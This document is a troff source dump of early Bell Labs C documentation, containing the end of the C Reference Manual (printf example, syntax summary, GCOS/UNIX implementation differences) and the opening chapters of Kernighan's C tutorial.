 \** The uncalled routine which puts a node on the free list.
 \**/
free^(^p^)^
struct tnode \**p^;
{
	p\(mi>left = freep^;
	freep = p^;
}
.sp .7
.fi
.eG
.in 0
To illustrate a slightly different technique of
handling the same problem, we will repeat
fragments of this example with the tree nodes
treated explicitly as members of an array.
The fundamental change is to
deal with the subscript
of the array member under
discussion, instead of a pointer to it.
The \fGstruct\fR declaration becomes
.sp .7
.nf
.bG
	struct tnode {
		char tword^[^wsize^]^;
		int count;
		int left;
		int right;
	};
.fi
.eG
.sp .7
and \fIalloc\fR becomes
.sp .7
.nf
.bG
	alloc^(^^)^
	{
		int t;
.sp .5
		t = \fR\(mi\(mi\fGnnodes;
		if ^(^t<=0^)^ {
			printf^(^"Out of space\\n"^)^;
			exit^(^^)^;
		}
		return^(^t^)^;
	}
.fi
.eG
.sp .7
The \fIfree\fR stuff has disappeared because
if we deal with exclusively with
subscripts some sort of map has
to be kept, which is too much trouble.
.pg
Now the \fItree\fR routine returns
a subscript also, and it becomes:
.sp .7
.nf
.bG
	tree^(^p, word^)^
	char word^[^^]^;
	{
		int cond;
.sp .5
		if ^(^p\fR==\fG0^)^ {
			p = alloc^(^^)^;
			copy^(^word, space^[^p^]^.tword^)^;
			space^[^p^]^.count = 1;
			space^[^p^]^.right = space^[^p^]^.left = 0;
			return^(^p^)^;
		}
		if ^(^^(^cond=compar^(^space^[^p^]^.tword, word^)^^)^ \fR==\fG 0^)^ {
			space^[^p^]^.count\fR++\fG;
			return^(^p^)^;
		}
		if ^(^cond<0^)^
			space^[^p^]^.left = tree^(^space^[^p^]^.left, word^)^;
		else
			space^[^p^]^.right = tree^(^space^[^p^]^.right, word^)^;
		return^(^p^)^;
	}
.fi
.eG
.sp .7
The other routines are changed similarly.
It must be pointed out that
this version is noticeably
less efficient than the first because
of the multiplications which
must be done
to compute an offset in \fIspace\fR
corresponding to the subscripts.
.pg
The observation that subscripts
^(^like ``a^[^i^]^''^)^ are less efficient
than pointer indirection ^(^like ``\**ap''^)^
holds true independently of whether or not
structures are involved.
There are of course many situations where subscripts
are indispensable, and others where the loss
in efficiency is worth a gain in clarity.
.ms
16.3  Formatted output
.et
Here is a simplified version of the \fIprintf\fR routine, which is
available in the C library.
It accepts a string ^(^character array^)^
as first argument, and prints subsequent arguments
according to specifications contained in
this format string.
Most characters in the string are simply
copied to the output; two-character sequences beginning
with ``%'' specify that the next argument
should be printed in a style as follows:
.sp .7
.nf
	%d	decimal number
	%o	octal number
	%c	\s8ASCII\s10 character, or 2 characters if \
upper character is not null
	%s	string ^(^null-terminated array of characters^)
	%f	floating-point number
.sp .7
.fi
The actual parameters for each function
call are laid out contiguously in
increasing storage locations;
therefore, a function with a variable number
of arguments
may take the address of ^(^say^)^ its first argument,
and access the remaining arguments by use
of subscripting ^(^regarding the arguments
as an array^)^
or by indirection combined with
pointer incrementation.
.pg
If in such a situation
the arguments have mixed types, or if in general
one wishes to insist that an lvalue should
be treated as having a given type, then
\fGstruct\fR declarations like those illustrated below
will be useful.
It should be evident, though,
that such techniques are implementation dependent.
.pg
\fIPrintf\fR depends as well on the fact that
\fGchar\fR and \fGfloat\fR arguments
are widened respectively to \fGint\fR and \fGdouble\fR,
so there are effectively only two sizes of arguments
to deal with.
\fIPrintf\fR calls the library routines
\fIputchar\fR to write out single characters
and \fIftoa\fR to dispose of
floating-point numbers.
.sp .7
.in .5i
.bG
.nf
printf^(^fmt, args^)^
char fmt^[^^]^;
{
	char \**s^;
	struct { char \**\**charpp^; };
	struct { double \**doublep^; };
	int \**ap, x, c^;
.sp .5
	ap = &args^;			 /\** argument pointer \**/
	for ( ; ; ) {
		while^(^^(^c = \**fmt\fR++\fG^)^ != \(aa%\(aa^)^ {
			if^(^c \fR==\fG \(aa\\0\(aa^)^
				return^;
			putchar^(^c^)^;
		}
		switch ^(^c = \**fmt\fR++\fG^)^ {
		/\** decimal \**/
		case \(aad^\(aa:
			x = \**ap\fR++\fG^;
			if^(^x < 0^)^ {
				x = \(mix^;
				if^(^x<0^)^ {  	/\** is \(mi infinity \**/
					printf^(^"\(mi32768"^)^;
					continue^;
				}
				putchar^(^\(aa\(mi\(aa^)^;
			}
			printd^(^x^)^;
			continue^;
		/\** octal \**/
		case \(aao\(aa:
			printo^(^\**ap\fR++\fG^)^;
			continue^;
		/\** float, double \**/
		case ^^\(aaf^\(aa:
			/\** let ftoa do the real work \**/
			ftoa^(^\**ap.doublep\fR++\fG^)^;
			continue^;
		/\** character \**/
		case \(aac\(aa:
			putchar^(^\**ap\fR++\fG^)^;
			continue^;
		/\** string \**/
		case \(aas\(aa:
			s = \**ap.charpp\fR++\fG^;
			while^(^c = \**s\fR++\fG^)^
				putchar^(^c^)^;
			continue^;
		}
		putchar^(^c^)^;
	}
}
/\**
 \** Print n in decimal^; n must be non-negative
 \**/
printd^(^n^)^
{
	int a^;
	if ^(^a=n/10^)^
		printd^(^a^)^;
	putchar^(^n%10 + \(aa0\(aa^)^;
}
/\**
 \** Print n in octal, with exactly 1 leading 0
 \**/
printo^(^n^)^
{
	if ^(^n^)^
		printo^(^^(^n>>3^)^&017777^)^;
	putchar^(^^(^n&07^)^+\(aa0\(aa^)^;
}
.br
.fi
.eG
.in 0
-- /usr/doc/c/ca mode=0110664 uid=3 gid=3 atime=170478278 mtime=173059629 --
.pn 26
.fp 3 G
'tr ^\|
'hc $
'tr @
'll 6.5i
'ps 10
.ds op \s6\d\fIopt\fP\u\s10
.ds * \fR\v'.2'*\fP\v'-.2'
.ds ~ \v'.5'\s14~\s10\v'-.5'
'vs 11p
.de pg
.sp .4
.ti 1
..
.de et
.sp .2
.ft R
.ti 1
..
.de dp
.sp .7
.ne \\$1
.ft I
.nf
..
.de ed
.fi
.br
.ft R
..
.de ul
.sp 1.5
.ne 4
.ft G
..
.de ms
.sp  1
.ne 4
..
.de fo
'bp
..
.de he
.po 0
.tl '-'''
.po
'sp 0.5i
.ft I
.if o .tl '''C  Reference  Manual - %'
.if e .tl 'C  Reference  Manual - %'''
.ft
'sp 0.4i
..
.de bG
.br
.fp 3 G
.ft G
..
.de eG
.br
.ft R
..
.de it
.ft I
\\$1
.ft R
..
.de bd
.ft G
\\$1
.ft R
..
.de se
.br
.ft I
..
.wh 0 he
.wh -1i fo
.sp 2
.ce
REFERENCES
.sp 1.5
.ta 2
.tc @
.in 2
.ti 0
1.	Johnson, S. C., and Kernighan, B. W.
``The Programming Language B.'' Comp. Sci. Tech. Rep. #8., Bell Laboratories,
1972.
.sp .6
.ti 0
2.	Ritchie, D. M., and Thompson, K. L.
``The \s8UNIX\s10 Time-sharing System.''
C. ACM \fG7, \fR17, July, 1974, pp. 365-375.
.sp .6
.ti 0
3.	Peterson, T. G., and Lesk, M. E.
``A User's Guide to the C Language on the IBM 370.''
Internal Memorandum, Bell Laboratories, 1974.
.sp .6
.ti 0
4.	Thompson, K. L., and Ritchie, D. M.
.ft I
\s8UNIX\s10 Programmer's Manual.
.ft R
Bell Laboratories, 1973.
.sp .7
.ti 0
5.	Lesk, M. E., and Barres, B. A.
``The \s8GCOS\s10 C Library.''
Internal memorandum, Bell Laboratories,
1974.
.sp .7
.to 0
.ti 0
6.	Kernighan, B. W.  ``Programming in C\(mi A Tutorial.''
Unpublished internal memorandum,
Bell Laboratories, 1974.
.in 0
.bp
.sp 1.5
.ce 2
APPENDIX 1
.sp .3
Syntax Summary
.sp 1.5
.ta .5i 1i 1.5i 2i 2.5i
.in 3
1.  Expressions.
.sp 1
.dp 4
	expression:
		primary
		\**\fI expression
		\fG&\fI expression
		\fG\(mi\fI expression
		\fG!\fI expression
		\*~ expression
		\fR++\fI lvalue
		\fR\(mi\(mi\fI lvalue
		lvalue \fR++\fI
		lvalue \fR\(mi\(mi\fI
		\fGsizeof \fIexpression
		expression binop expression
		expression \fG?\fI expression \fG:\fI expression
		lvalue asgnop expression
		expression \fG,\fI expression
.ed
.dp 6
	primary:
		identifier
		constant
		string
		\fG( \fIexpression \fG)\fI
		\fIprimary \fG( \fIexpression-list\*(op \fG)\fI
		primary \fG[\fI expression \fG]\fI
		lvalue \fG. \fIidentifier
		primary \fG\(em> \fIidentifier
.ed
.dp 2
	lvalue:
		identifier
		primary \fG[ \fIexpression \fG]\fI
		lvalue \fG. \fIidentifier
		primary \fG\(em>\fI identifier
		\** \fI expression
		\fG(  \fIlvalue  \fG)\fR
.ed
.fi
.sp .7
The primary-expression operators
.dp
.ft G
	(^)  [^]  .  \(em>
.sp .5
.ed
have highest priority and group left-to-right.
The unary operators
.dp
.ft G
	\*  &  \(mi  !  \*~  \fR++  \(mi\(mi  \fGsizeof
.ed
.sp .5
have priority below the primary operators
but higher than any binary operator,
and group right-to-left.
Binary operators and the conditional operator
all group left-to-right, and have priority
decreasing
as indicated:
.dp
.ft I
	binop:
.ft G
		\**    /    %
		+    \(mi
		>>    <<
		<    >    <=    >=
		==    !=
		&
.tr ^^
		^
.tr ^\|
		\(or
		&&
		\(or\(or
		?  :
.tr ^^
.sp .4
.fi
.ft R
Assignment operators all have the same
priority, and all group right-to-left.
.dp 3
.ft I
	asgnop:
.ft G
		=  =+  =\(mi  =\**  =/  =%  =>>  =<<  =&  =^  =\(or
.ed
.tr ^\|
.sp .4
.ft R
The comma operator has the lowest priority, and groups left-to-right.
.sp .7
2.  Declarations.
.dp 2
	declaration:
		decl-specifiers declarator-list\*(op  \fG;
.ed
.dp 5
	decl-specifiers:
		type-specifier
		sc-specifier
		type-specifier sc-specifier
		sc-specifier type-specifier
.ed
.dp 4
	sc-specifier:
.ft G
		auto
		static
		extern
		register
.ed
.dp 6
	type-specifier:
		\fGint
		\fGchar
		\fGfloat
		\fGdouble
		struct { \fItype-decl-list }\fG
		struct \fIidentifier { type-decl-list }\fG
		struct \fIidentifier\fG
.ed
.dp 2
	declarator-list:
		declarator
		declarator \fG,\fI declarator-list
.ed
.dp 6
	declarator:
		identifier
		\** \fIdeclarator
		declarator \fG( )\fI
		declarator \fG[\fI constant-expression\*(op \fG]\fI
		\fG( \fIdeclarator \fG)
.ed
.dp 2
	type-decl-list:
		type-declaration
		type-declaration type-decl-list
.ed
.dp 2
	type-declaration:
		type-specifier declarator-list  \fG;
.ed
.sp 1.5
3. Statements.
.dp 1
	statement:
		expression \fG;
.se
		{ \fIstatement-list }
.se
		\fGif ( \fIexpression \fG) \fIstatement
.se
		\fGif ( \fI expression \fG) \fIstatement \fGelse \fIstatement
.se
		\fGwhile ( \fIexpression \fG) \fIstatement
.se
		\fGfor ( \fIexpression\*(op \fG; \fIexpression\*(op \fG; \fIexpression\*(op \fG) statement
.se
		\fGswitch ( \fIexpression \fG) \fIstatement
.se
		\fGcase \fIconstant-expression \fG:\fI statement
.se
		\fGdefault : \fIstatement
.se
		\fGbreak ;
.se
		\fGcontinue ;
.se
.ft G
		return ;
.se
.ft G
		return ( \fIexpression \fG) ;
.se
.ft G
		goto \fIexpression \fG;
.se
		\fIidentifier \fG: \fIstatement
.se
		\fG;
.ed
.dp 2
	statement-list:
		statement
		statement statement-list
.sp 1.5
.ft R
4.  External definitions.
.dp 2
	program:
		external-definition
		external-definition program
.dp 2
	external-definition:
		function-definition
		data-definition
.ed
.dp 2
	function-definition:
		type-specifier\*(op \fIfunction-declarator function-body
.ed
.dp 2
	function-declarator:
		declarator \fG( \fI parameter-list\*(op \fG)
.ed
.dp 1
	parameter-list:
		identifier
		identifier \fG,\fI parameter-list
.ed
.dp 1
	function-body:
		type-decl-list function-statement
.ed
.dp 2
	function-statement:
		{ declaration-list\*(op statement-list }
.ed
.dp 2
	data-definition:
		\fGextern\fI\*(op type-specifier\*(op init-declarator-list\*(op \fG;
.ed
.dp 2
	init-declarator-list:
		init-declarator
		init-declarator \fG,\fI init-declarator-list
.ed
.dp 2
	init-declarator:
		declarator initializer\*(op
.ed
.dp 5
	initializer:
		constant
		{ constant-expression-list }
.ed
.dp 5
	constant-expression-list:
		constant-expression
		constant-expression \fG,\fI constant-expression-list
.ed
.dp 2
	constant-expression:
		expression
.ed
.sp .4
5.  Preprocessor
.dp 1
	\fG# define \fIidentifier token-string
.ed
.dp 1
	\fG# include "\fIfilename^\fG"
.ed
.in 0
.bp
.ds s \\s8
.ds n \\s10
.ft R
.fi
.sp 1
.ce 2
APPENDIX 2
Implementation Peculiarities
.sp 2
This Appendix briefly summarizes the differences between the implementations
of C on the \*sPDP\*n-11 under \*sUNIX\*n and on the
\*sHIS\*n 6070 under \*sGCOS\*n;
it includes some known bugs
in each implementation.
Each entry is keyed by an indicator as follows:
.sp
.ta .4i .8i
.nf
	h	hard to fix
	g	\*sGCOS\*n version should probably be changed
	u	\*sUNIX\*n version should probably be changed
	d	Inherent difference likely to remain
.sp
.fi
This list was prepared by M. E. Lesk, S. C. Johnson,
E. N. Pinson, and the author.
.sp 2
.fi
.ta .4i 1.2i
.in 1.2i
.ti0
.ft I
A. Bugs or differences from C language specifications
.ft R
.sp
.ti0
hg	A.1)	\*sGCOS\*n does not do type conversions in ``?:''.
.ti0
hg	A.2)	\*sGCOS\*n has a bug in \fGint\fR and \fGreal\fR comparisons; the numbers
are compared by subtraction, and the difference must not overflow.
.ti 0
g	A.3)	When \fIx\fR is a \fGfloat\fR, the construction ``test ? \(mix : x''
is illegal on \*sGCOS\*n.
.ti0
hg	A.4)	``p1\(mi>p2 =+ 2'' causes a compiler error, where p1 and p2 are pointers.
.ti0
u	A.5)	On \*sUNIX\*n, the expression in a \fGreturn\fR statement is \fInot\fR
converted to the type of the function, as promised.
.ti0
hug	A.6)	\fGentry\fR statement is not implemented at all.
.sp
.ne 5
.ft I
.ti0
.ft I
B. Implementation differences
.ft R
.sp
.ti0
d	B.1)	Sizes of character constants differ; \*sUNIX\*n: 2, \*sGCOS\*n: 4.
.ti0
d	B.2)	Table sizes in compilers differ.
.ti0
d	B.3)	\fGchar\fRs and \fGint\fRs have different sizes;
\fGchar\fRs are 8 bits on \*sUNIX\*n, 9 on \*sGCOS\*n; words are 16 bits
on \*sUNIX\*n and 36 on \*sGCOS\*n.
There are corresponding differences in representations of
\fGfloat\fRs and \fGdouble\fRs.
.ti0
d	B.4)	Character arrays stored left to right in a word
in \*sGCOS\*n, right to left in \*sUNIX\*n.
.ti0
g	B.5)	Passing of floats and doubles differs;
\*sUNIX\*n passes on stack, \*sGCOS\*n passes pointer (hidden to normal user).
.ti0
g	B.6)	Structures and strings are aligned on a word
boundary in \*sUNIX\*n, not aligned in \*sGCOS\*n.
.ti0
g	B.7)	\*sGCOS\*n preprocessor supports #rename, #escape;
\*sUNIX\*n has only #define, #include.
.ti0
u	B.8)	Preprocessor is not invoked on \*sUNIX\*n unless first
character of file is ``#''.
.ti0
u	B.9)	The external definition ``static int .^.^.''
is legal on \*sGCOS\*n, but gets a diagnostic on \*sUNIX\*n.
(On \*sGCOS\*n it means an identifier global to the
routines in the file but invisible to routines
compiled separately.)
.ti 0
g	B.10)	A compound statement on \*sGCOS\*n must contain one ``;''
but on \*sUNIX\*n may be empty.
.ti 0
g	B.11)	On \*sGCOS\*n case distinctions in identifiers and keywords are
ignored; on \*sUNIX\*n case is significant everywhere,
with keywords in lower case.
.sp
.ne 5
.ti0
.ft I
C. Syntax Differences
.ft R
.sp
.ti0
g	C.1)	\*sUNIX\*n allows broader classes of initialization;
on \*sGCOS\*n an initializer must be a constant, name, or string.
Similarly,
\*sGCOS\*n is much stickier about wanting braces
around initializers and in particular they must be present
for array initialization.
.ti0
g	C.2)	``int extern'' illegal on \*sGCOS\*n; must have ``extern int''
(storage class before type).
.ti0
g	C.3)	Externals on \*sGCOS\*n must have a type (not defaulted
to \fGint\fR).
.ti0
u	C.4)	\*sGCOS\*n allows initialization of internal \fGstatic\fR
(same syntax as for external definitions).
.ti0
g	C.5)	integer\(mi>... is not allowed on \*sGCOS\*n.
.ti0
g	C.6)	Some operators on pointers are illegal on \*sGCOS\*n (<, >).
.ti0
g	C.7)	\fGregister\fR storage class means something on \*sUNIX\*n,
but is not accepted on \*sGCOS\*n.
.ti0
g	C.8)	Scope holes: ``int x; f^(^^)^{int x;}'' is illegal on
\*sUNIX\*n but defines two variables on \*sGCOS\*n.
.ti0
g	C.9)	When function names are used as arguments on \*sUNIX\*n,
either ``fname'' or ``&fname'' may be used to get a pointer to the function;
on \*sGCOS\*n ``&fname'' generates a doubly-indirect pointer.
(Note that both are wrong since the ``&''
is supposed to be supplied for free.)
.sp
.ne 5
.ti0
.ft I
D. Operating System Dependencies
.sp
.ft R
.ti0
d	D.1)	\*sGCOS\*n allocates external scalars by SYMREF;
\*sUNIX\*n allocates external scalars as labelled common;
as a result there may be many
uninitialized external definitions of the same variable
on \*sUNIX\*n but only one on \*sGCOS\*n.
.ti0
d	D.2)	External names differ in allowable length and
character set;
on \*sUNIX\*n, 7 characters and both cases; on \*sGCOS\*n
6 characters and only one case.
.sp
.ne 5
.ft I
.ti0
E. Semantic Differences
.ft R
.sp
.ti0
hg	E.1)	``int i, *p; p=i; i=p;'' does nothing on \*sUNIX\*n,
does something on \*sGCOS\*n (destroys right half of i) .
.ti0
d	E.2)	``>>'' means arithmetic shift on \*sUNIX\*n, logical on \*sGCOS\*n.
.ti0
d	E.3)	When a \fGchar\fR is converted to integer, the result is always
positive on \*sGCOS\*n but can be negative on \*sUNIX\*n.
.ti0
d	E.4)	Arguments of subroutines are evaluated left-to-right
on \*sGCOS\*n, right-to-left on \*sUNIX\*n.
-- /usr/doc/ctut mode=0140775 uid=3 gid=3 atime=173059635 mtime=173059507 --
-- /usr/doc/ctut/ct0 mode=0100664 uid=3 gid=3 atime=170478281 mtime=173059636 --
.if t .ll 6i
.if n .ll 60
.de h
'sp 2
.tl 'C Tutorial'- % -''
'sp 3
..
.de f
'bp
..
.wh -6 f
.br
.wh 0 h
.	PP - paragraph
.de PP
.ne 2
.if t .sp 0.3
.if n .sp
.ti +5n
.ul 0
.ce 0
.ft R
..
.	DS - display.
.de DS
.nf
.nr oi \\n(.i
.if t .sp 0.5
.if n .sp 1
.if t .in +0.5i
.if n .in +8
..
.	DE - display end
.de DE
.if n .in \\n(oi
.if t .in \\n(oiu
.if t .sp 0.5
.if n .sp 1
.fi
..
.	IP - indented paragraph
.de IP
.if t .sp 0.3
.if n .sp
.ne 3
.in +5n
.if n .ta 5+1
.if t .ta 5n
.ti -5n
\\$1\t\c
..
.	SH - (unnumbered) section heading
.de SH
.sp 1
.ne 7
.ft B
.if n .ul 1000
..
.tr |\(or
.ds . \s16.\s0
.ds | \(or\|\(or
.ds + \fR++\fP
.ds = \fR==\fP
.ds * \s14\v'.35m'*\v'-.35m'\s0
.fp 3 G
.		UL - identifiers, etc.
.de UL
\fG\\$1\fP
..
.		WS - white space
.de WS
.sp \\$1
..
.		UC - make upper case smaller
.de UC
.if t \s-2\\$1\s+2
.if n \\$1
..
.		E1 - begin a block
.de E1
.br
.lg 0
.if n .sp
.if t .sp 5p
.nf
.if n .in 5
.if t .in .5i
.if t .tr '\(fm
.if t .ss 15
.if t .tr -\(mi
.if t .tr _\(ru
.ft G
.if t .ta .5i 1i 1.5i 2i 2.5i 3i 3.5i
.if n .ta 8 16 24 32 40 48
..
.		E2 - end a block
.de E2
.br
.tr ''
.tr --
.tr __
.tr ~
.in
.lg
.ft R
.fi
.if t .sp 5p
.if n .sp
.if t .ss 12
..
.		SP - add extra space
.de SP
.if t .sp 5p
.if n .sp
..
.ds CF "
.ds LH C Tutorial
.tr ~
.de NH
.sp 1
.ne 4
.ft G
.if n .ul 1000
.nr SN \\n(SN+1
\\n(SN.   \\$1 \\$2 \\$3 \\$4 \\$5 \\$6 \\$7 \\$8 \\$9
..
-- /usr/doc/ctut/ct1 mode=0110664 uid=3 gid=3 atime=170478282 mtime=173059636 --
.sp |2.5i
.ce 3
.ps 12
.ft G
Programming in C _ A Tutorial
.ps 10
.sp
.ft R
Brian W. Kernighan
.ft I
.sp
Bell Laboratories, Murray Hill, N. J.
.sp |4.1i
.ft R
.ps 10
.fi
.vs 12p
.NH
Introduction
.PP
C is a computer language
available on the
.UC GCOS
and
.UC UNIX
operating systems at Murray Hill and (in preliminary form) on OS/360 at Holmdel.
C lets you write your programs clearly and simply _
it has decent control flow facilities so your code can be read
straight down the page, without labels or GOTO's;
it lets you write code that is compact without
being too cryptic;
it encourages modularity and good program organization;
and it provides good data-structuring facilities.
.PP
This memorandum is a tutorial to make learning C as painless as possible.
The first part concentrates on 
the central features of C;
the second part discusses
those parts of the language which are
useful (usually for getting more efficient
and smaller code)
but which are not necessary for the new user.
This is
.ul
not
a reference manual.
Details and special cases will be skipped ruthlessly,
and no attempt will be made to cover every language feature.
The order of presentation is hopefully pedagogical
instead of logical.
Users who would like the full story should consult the
.ul
C Reference Manual
by D. M. Ritchie [1],
which should be read for details anyway.
Runtime support is described in
[2] and [3];
you will have to read one of these to learn how
to compile and run a C program.
.PP
We will assume that you are familiar with the mysteries of 
creating files,
text editing, and the like
in the operating system you run on,
and that you have programmed in some language before.
.NH
A Simple C Program
.PP
.E1
main(~) {
	printf("hello, world");
}
.E2
.PP
A C program consists of one or more
.ul
functions,
which are similar to
the functions and subroutines of a Fortran program or the procedures
of PL/I,
and perhaps some external data definitions.
.UL main
is such a function, and in fact all C programs must have a
.UL main\*.
Execution of the program begins at the first statement of 
.UL main\*.
.UL main
will usually invoke other functions to perform its job, some
coming from the same program, and others from libraries.
.PP
One method of communicating data between functions
is by arguments.
The parentheses following the function name surround the argument list;
here
.UL main
is a function of no arguments, indicated by (~).
The {} enclose the statements of the function.
Individual statements end with a semicolon
but are otherwise free-format.
.PP
.UL printf
is a library function which will format and print
output
on the terminal (unless some other destination is
specified).
In this  case it prints
.E1
hello, world
.E2
A function is invoked by naming it,
followed by a list of arguments in parentheses.
There is
no
.UC CALL
statement as in Fortran or 
.UC PL/I.
.NH
A Working C Program; Variables; Types and Type Declarations
.PP
Here's a bigger program that adds three integers and prints their sum.
.E1
main(~) {
	int a, b, c, sum;
	a = 1;  b = 2;  c = 3;
	sum = a + b + c;
	printf("sum is %d", sum);
}
.E2
.PP
Arithmetic and the assignment statements are much
the same as in Fortran (except for the semicolons)
or
.UC PL/I.
The format of C programs is quite free.
We can put several statements on a line if we want,
or we can split a statement among several lines if
it seems desirable. The split may be between any of the operators or variables,
but
.ul
not
in the middle of a name or operator.
As a matter of style,
spaces, tabs, and newlines should be used freely
to enhance readability.
.PP
C has four 
fundamental
.ul
types
of variables:
.DS
\fGint\fR	integer (PDP-11: 16 bits; H6070: 36 bits; IBM360: 32 bits)
\fGchar\fR	one byte character (PDP-11, IBM360: 8 bits; H6070: 9 bits)
\fGfloat\fR	single-precision floating point
\fGdouble\fR	double-precision floating point
.DE
There are also
.ul
arrays
and
.ul
structures
of these basic types,
.ul
pointers
to them
and
.ul
functions
that return them,
all of which we will meet shortly.
.PP
.ul
All
variables in a C program must be declared,
although this can sometimes be done implicitly by context.
Declarations must precede executable statements.
The declaration
.E1
int a, b, c, sum;
.E2
declares
.UL a,
.UL b,
.UL c,
and
.UL sum
to be integers.
.PP
Variable names have one to eight characters, chosen from A-Z, a-z, 0-9, and \(ul,
and start with a non-digit.
Stylistically, it's much better to use only a single case
and give functions and external variables names that are unique in the first
six characters.
(Function and external variable names are used by various assemblers, some of which are limited
in the size and case of identifiers they can handle.)
Furthermore, keywords and library functions
may only be recognized in one case.
.NH
Constants
.PP
We have already seen decimal integer constants in
the previous example _
1, 2, and 3.
Since C is often used for system programming and bit-manipulation, octal
numbers are an important part of the language.
In C, any number that begins with 0
(zero!)
is an octal integer (and hence can't have
any 8's or 9's in it).
Thus 0777 is an octal constant, with decimal value 511.
.PP
A ``character'' is one byte
(an inherently machine-dependent concept).
Most often this is expressed as a 
.ul
character constant,
which is one character enclosed in single quotes.
However, it may be any quantity that fits in a byte,
as in
.UL flags
below:
.E1
char quest, newline, flags;
quest = '?';
newline = '\\n';
flags = 077;
.E2
.PP
The sequence `\\n' is C notation for ``newline character'', which, when printed, skips
the terminal to the beginning of the next line.
Notice that `\\n' represents only a single character.
There are several other ``escapes'' like `\\n'  for representing hard-to-get or invisible
characters,
such as
`\\t' for tab,
`\\b' for backspace,
`\\0' for end of file,
and
`\\\\' for the backslash itself.
.PP
.UL float
and
.UL double
constants
are discussed in section 26.
.NH
Simple I/O _ getchar, putchar, printf
.PP
.E1
main( ) {
	char c;
	c = getchar(~);
	putchar(c);
}
.E2
.PP
.UL getchar
and
.UL putchar
are the basic I/O library functions in C.
.UL getchar
fetches one character
from the standard input
(usually the terminal)
each time it is called, and returns that character
as the
value of the function.
When it reaches the end of whatever file it is reading,
thereafter it returns the character represented by `\\0'
(ascii
.UC NUL,
which has value zero).
We will see how to use this very shortly.
.PP
.UL putchar
puts one character out on the standard output
(usually the terminal)
each time it is called.
So the program above
reads one character and writes it back out.
By itself, this isn't very interesting,
but observe that if we put a loop around this,
and add a test for end of file,
we have a complete program for
copying one file to another.
.PP
.UL printf
is a more complicated function
for producing formatted output.
We will talk about only the simplest use
of it.
Basically,
.UL printf
uses its first argument as formatting information,
and any successive arguments
as variables to be output.
Thus
.E1
printf ("hello, world\\n");
.E2
is the simplest use _
the string ``hello, world\\n''
is printed out.
No formatting information, no variables,
so the string is dumped out verbatim.
The newline is necessary to put this out on a line by itself.
(The construction
.E1
"hello, world\\n"
.E2
is really an array of
.UL chars\*.
More about this shortly.)
.PP
More complicated, if
.UL sum
is
6,
.E1
printf ("sum is %d\\n", sum);
.E2
prints
.E1
sum is 6
.E2
Within the first argument of
.UL printf,
the characters ``%d'' signify that the next argument
in the argument list is to be printed as a
base 10
number.
.PP
Other useful formatting commands are ``%c'' to print out a single character,
``%s'' to print out an entire string,
and ``%o'' to print a number as octal instead of decimal
(no leading zero).
For example,
.E1
n = 511;
printf ("What is the value of %d in octal?", n);
printf ("  %s! %d decimal is %o octal\\n", "Right", n, n);
.E2
prints
.E1
.fi
What is the value of 511 in octal?
Right! 511 decimal is 777 octal
.E2
Notice that there is no newline at the end of the first
output line.
Successive calls to
.UL printf
(and/or
.UL putchar,
for that matter)
simply put out characters.
No newlines are printed unless you ask for them.
Similarly, on input, characters are read one at a time
as you ask for them.
Each line is generally terminated by a newline (\\n),
but there is otherwise no concept of record.
-- /usr/doc/ctut/ct2 mode=0110664 uid=3 gid=3 atime=170478283 mtime=173059636 --
.NH
If; relational operators; compound statements
.PP
The basic conditional-testing statement in C
is the
.UL if
statement:
.E1
c = getchar( );
if( c \*= '?' )
	printf("why did you type a question mark?\\n");
.E2
The simplest form of
.UL if
is
.E1
if (expression) statement
.E2
.PP
The condition to be tested is any expression enclosed in parentheses.
It is followed by a statement.
The expression is evaluated, and if its value is non-zero,
the statement is executed.
There's an
optional
.UL else
clause, to be described soon.
.PP
The character sequence `=='  is one of the relational operators in C;
here is the complete set:
.E1
\*=	equal to (\*.EQ\*. to Fortraners)
!=	not equal to
>	greater than
<	less than
>=	greater than or equal to
<=	less than or equal to
.E2
.PP
The value of
.UL ``expression
.UL relation
.UL expression''
is 1 if the relation is true,
and 0 if false.
Don't forget that the equality test is `==';
a single `=' causes an assignment, not a test,
and invariably leads to disaster.
.PP
Tests can be combined with the operators 
.UL `&&'
.UC (AND),
.UL `\*|'
.UC (OR),
and
.UL `!'
.UC (NOT).
For example, we can test whether a character is blank or tab or newline
with
.E1
if( c\*=' ' \*| c\*='\\t' \*| c\*='\\n' ) \*.\*.\*.
.E2
C guarantees that
.UL `&&'
and
.UL `\*|'
are evaluated left to right _
we shall soon see cases where this matters.
.PP
One of the nice things about C is that the
.UL statement
part of an 
.UL if
can be made arbitrarily complicated
by enclosing a set of statements
in {}.
As a simple example,
suppose we want to ensure that
.UL a
is bigger than
.UL b,
as part of a sort routine.
The interchange of
.UL a
and
.UL b
takes three statements in C,
grouped together by {}:
.E1
.ne 5
if (a < b) {
	t = a;
	a = b;
	b = t;
}
.E2
.PP
As a general rule in C, anywhere you can use a simple statement,
you can use any compound statement, which is just a number of simple
or compound ones enclosed in {}.
There is no semicolon after the } of a compound statement,
but there
.ul
is
a semicolon after the last non-compound statement inside the {}.
.PP
The ability to replace single statements by complex ones at will
is one feature that makes C much more pleasant to use than Fortran.
Logic (like the exchange in the previous example) which would require several GOTO's and labels in Fortran can
and should
be
done in C without any, using compound statements.
.NH
While Statement; Assignment within an Expression; Null Statement
.PP
The basic looping mechanism in C is the
.UL while
statement.
Here's a program that copies its input to its output
a character at a time.
Remember that `\\0' marks the end of file.
.E1
main(~) {
	char c;
	while( (c=getchar(~)) != '\\0' )
		putchar(c);
}
.E2
The
.UL while
statement is a loop, whose general form
is
.E1
while (expression) statement
.E2
Its meaning is
.E1
(a) evaluate the expression
(b) if its value is true (i\*.e\*., not zero)
		do the statement, and go back to (a)
.E2
Because the expression is tested before the statement
is executed,
the statement part can be executed zero times,
which is often desirable.
As in the
.UL if
statement, the expression and the statement can both be
arbitrarily complicated, although we haven't seen that yet.
Our example gets the character,
assigns it to
.UL c,
and then tests if it's a `\\0''.
If it is not a `\\0',
the statement part of the 
.UL while 
is executed,
printing the character.
The
.UL while
then repeats.
When the input character is finally a `\\0',
the
.UL while
terminates,
and so does
.UL main\*.
.PP
Notice that we used an assignment statement
.E1
c = getchar(~)
.E2
within an expression.
This is a handy notational shortcut which often produces clearer code.
(In fact it is often the only way to write the code cleanly.
As an exercise, re-write the file-copy without
using an assignment inside an expression.)
It works because an assignment statement has a value, just as any
other expression does.
Its value is the value of the right hand side.
This also implies that we can use multiple assignments like
.E1
x = y = z = 0;
.E2
Evaluation goes from right to left.
.PP
By the way, the extra parentheses in the assignment statement
within the conditional were really necessary:
if we had said
.E1
c = getchar(~) != '\\0'
.E2
.UL c
would be set to 0 or 1 depending on whether the character fetched
was an end of file or not.
